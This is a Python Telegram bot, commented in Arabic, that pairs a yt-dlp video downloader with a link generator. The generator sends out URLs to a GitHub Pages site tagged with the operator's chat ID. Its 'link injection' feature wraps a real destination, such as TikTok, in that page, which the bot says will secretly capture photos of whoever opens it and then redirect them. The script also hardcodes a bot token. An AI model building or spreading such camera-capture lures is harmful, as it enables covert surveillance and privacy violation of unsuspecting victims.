import os
import json
import urllib3
import telebot
from telebot import types
import threading
import http.server
import yt_dlp

# إيقاف التحذيرات
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc"
bot = telebot.TeleBot(BOT_TOKEN)

# روابط الصفحات الخاصة بك
PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld2/" # تم التحديث للرابط المطلوب
user_states = {}

# --- السيرفر للبقاء نشطاً ---
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

# --- دالة التحميل ---
def download_video_sync(url, chat_id):
    try:
        file_path = f'/tmp/vid_{chat_id}.mp4'
        ydl_opts = {
            'format': 'best[ext=mp4]/best',
            'outtmpl': file_path,
            'quiet': True,
            'no_warnings': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            if os.path.exists(file_path): os.remove(file_path)
            info = ydl.extract_info(url, download=True)
            return file_path, info.get('title', 'Video')
    except Exception as e: return None, str(e)

def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
        types.InlineKeyboardButton("🌐 أخبار وبث مباشر", callback_data="news_menu"),
        types.InlineKeyboardButton("🔒 حقن رابط", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "👋 أهلاً بك في بوت المطور سيف الدين!", reply_markup=get_main_keyboard())

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    
    if call.data == "news_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🔴 الجزيرة مباشر", web_app=types.WebAppInfo(url="https://www.aljazeera.net/live")),
            types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu")
        )
        bot.edit_message_text("🌐 البث المباشر:", chat_id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "inject_start":
        user_states[chat_id] = "waiting_for_inject_link"
        bot.edit_message_text("🔗 أرسل الرابط الذي تريد توجيه المستخدم إليه (مثلاً رابط تيك توك):", chat_id, call.message.message_id)

    elif call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("📥 أرسل رابط الفيديو للتحميل:", chat_id, call.message.message_id)
    
    elif call.data == "main_menu":
        bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
    
    elif call.data.startswith("get_"):
        bot.send_message(chat_id, f"🔗 الرابط جاهز:\n{PHOTO_PAGE_URL}?chatId={chat_id}")
    
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    
    if state == "waiting_for_inject_link":
        target_url = message.text if message.text.startswith("http") else f"https://{message.text}"
        # الدمج: رابط صفحتك + الهدف
        injected_link = f"{PHOTO_PAGE_URL}?target={target_url}&chatId={chat_id}"
        bot.reply_to(message, f"✅ تم دمج الرابط:\n{injected_link}\n\nسيقوم الرابط بالتقاط الصور ثم التوجيه.")
        user_states[chat_id] = None
        
    elif state == "waiting_for_url":
        status_msg = bot.reply_to(message, "⏳ جاري التحميل...")
        path, title = download_video_sync(message.text, chat_id)
        if path:
            bot.send_video(chat_id, open(path, 'rb'), caption=title)
            bot.delete_message(chat_id, status_msg.message_id)
            os.remove(path)
        else:
            bot.edit_message_text(f"❌ فشل التحميل.", chat_id, status_msg.message_id)
        user_states[chat_id] = None

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    bot.polling(none_stop=True)
